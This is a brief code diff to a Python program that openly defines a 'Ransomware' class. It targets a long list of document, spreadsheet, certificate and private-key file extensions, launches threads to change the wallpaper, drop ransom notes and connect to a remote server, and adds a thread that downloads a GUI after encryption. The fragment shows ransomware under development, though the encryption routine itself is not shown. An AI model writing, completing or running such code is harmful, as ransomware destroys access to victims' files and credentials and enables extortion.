@@ -21,7 +21,7 @@ file_extension = ('.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
                   '.otp', '.odp', '.wb2', '.slk', '.dif', '.stc', '.sxc', '.ots', '.ods', '.3dm', '.max', '.3ds',
                   '.uot', '.stw', '.sxw', '.ott', '.odt', '.pem', '.p12', '.csr', '.crt', '.key', '.pfx', '.der')
 
-def setup_files():
+def download_gui():
     # Download GUI
     pass
 
@@ -67,6 +67,7 @@ class Ransomware:
         threading.Thread(target=self.wallpaper).start()
         threading.Thread(target=self.notes).start()
         threading.Thread(target=self.connect_to_server).start()
+        threading.Thread(target=download_gui).start() # download the gui after the encryption so it won't corrupt
 
     def connect_to_server(self):
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as self.sock:
